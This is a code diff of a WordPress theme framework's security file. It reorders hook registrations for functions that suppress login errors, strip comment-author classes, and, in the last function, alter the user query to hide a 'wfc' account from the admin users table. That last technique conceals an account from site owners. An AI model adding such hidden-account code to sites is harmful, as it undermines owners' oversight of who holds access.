@@ -8,14 +8,12 @@
     /**
      * This file houses all our security functions.
      */
-    /*~~~~ REMOVE WORDPRESS VERSION */
-    /*~~~~ HIDE LOGIN ERROR MESSAGES (WRONG PASSWORD, NO SUCH USER ETC.) */
-    /*~~~~ REMOVE ADMIN NAME IN COMMENTS CLASS */
     /*
     ===============================
     FRAMEWORK SECURITY SETUP
     ===============================
     */
+    add_action( 'after_setup_theme', 'wfc_framework_security_setup' );
     if( !function_exists( 'wfc_framework_security_setup' ) ):
         function wfc_framework_security_setup(){
             /*
@@ -32,12 +30,12 @@
             add_filter( 'login_errors', create_function( '$a', "return null;" ) );
         }
     endif; // wfc_framework_security_setup
-    add_action( 'after_setup_theme', 'wfc_framework_security_setup' );
     /*
     ===============================
     REMOVE ADMIN NAME IN COMMENTS CLASS
     ===============================
     */
+    add_filter( 'comment_class', 'wfc_remove_comment_author_class' );
     function wfc_remove_comment_author_class( $classes ){
         foreach( $classes as $key => $class ){
             if( strstr( $class, "comment-author-" ) ){
@@ -47,12 +45,12 @@
         return $classes;
     }
 
-    add_filter( 'comment_class', 'wfc_remove_comment_author_class' );
     /*
     ===============================
     REMOVE 'WFC' USER FROM USERS TABLE
     ===============================
     */
+    add_action( 'pre_user_query', 'wfc_remove_our_user' );
     function wfc_remove_our_user( $user_search ){
         global $current_user;
         global $wpdb;
@@ -62,5 +60,3 @@
                 "WHERE 1=1 AND {$wpdb->users}.ID<>1", $user_search->query_where );
         }
     }
-
-    add_action( 'pre_user_query', 'wfc_remove_our_user' );
